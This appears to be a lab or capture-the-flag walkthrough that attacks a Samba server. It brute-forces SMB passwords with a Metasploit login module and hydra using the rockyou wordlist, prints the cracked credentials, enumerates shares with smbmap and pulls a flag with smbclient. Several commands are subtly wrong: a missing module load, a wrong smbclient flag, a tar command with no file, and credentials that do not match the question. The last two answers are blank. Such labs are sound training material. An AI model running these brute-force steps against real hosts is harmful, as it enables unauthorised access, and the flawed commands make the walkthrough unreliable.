1. What is the password of user “jane” required to access share “jane”? Use smb_login metasploit module with password wordlist /usr/share/wordlists/metasploit/unix_passwords.txt
   
```
msfconsole 
set RHOSTS 192.62.179.3 
set SMBUser jane 
set PASS_FILE /usr/share/wordlists/rockyou.txt
exploit

[*] 192.62.179.3:445      - 192.62.179.3:445 - Starting SMB login bruteforce
[-] 192.62.179.3:445      - 192.62.179.3:445 - Failed: '.\jane:123456',
[-] 192.62.179.3:445      - 192.62.179.3:445 - Failed: '.\jane:12345',
[-] 192.62.179.3:445      - 192.62.179.3:445 - Failed: '.\jane:123456789',
[-] 192.62.179.3:445      - 192.62.179.3:445 - Failed: '.\jane:password',
[-] 192.62.179.3:445      - 192.62.179.3:445 - Failed: '.\jane:iloveyou',
[-] 192.62.179.3:445      - 192.62.179.3:445 - Failed: '.\jane:princess',
[-] 192.62.179.3:445      - 192.62.179.3:445 - Failed: '.\jane:1234567',
[-] 192.62.179.3:445      - 192.62.179.3:445 - Failed: '.\jane:rockyou',
[-] 192.62.179.3:445      - 192.62.179.3:445 - Failed: '.\jane:12345678',
[+] 192.62.179.3:445      - 192.62.179.3:445 - Success: '.\jane:abc123'
[*] 192.62.179.3:445      - Scanned 1 of 1 hosts (100% complete)
```
   
2. What is the password of user “admin” required to access share “admin”? Use hydra with password wordlist: /usr/share/wordlists/rockyou.txt
   
```
hydra  -l admin -P /usr/share/wordlists/rockyou.txt 192.62.179.3 smb

[445][smb] host: 192.62.179.3   login: admin   password: password1
```
   
3. Which share is read only? Use smbmap with credentials obtained in question 2.
   
```
smbmap -H 192.62.179.3 -u admin -p password1

[+] IP: 192.62.179.3:445        Name: target-1                                          
        Disk                                                    Permissions
        ----                                                    -----------
        shawn                                                   READ, WRITE
        nancy                                                   READ ONLY
        admin                                                   READ, WRITE
        IPC$                                                    NO ACCESS
```
   
4. Is share “jane” browseable? Use credentials obtained from the 1st question.
   
```
smbmap -H 192.62.179.3 -u admin -p password1

No user jane
```
   
5. Fetch the flag from share “admin”
   
```
smbclient //192.62.179.3/admin -u admin 
password1 
cd hidden 
get flag.tar.gz
exit 
gzip -d flag.tar.gz
tar -xvf
cat flag

2727069bc058053bd561ce372721c92e
```
   
6. List the named pipes available over SMB on the samba server? Use  pipe_auditor metasploit module with credentials obtained from question 2.
   
```

```
   
7. List sid of Unix users shawn, jane, nancy and admin respectively by performing RID cycling  using enum4Linux with credentials obtained in question 2.
   
```

```
   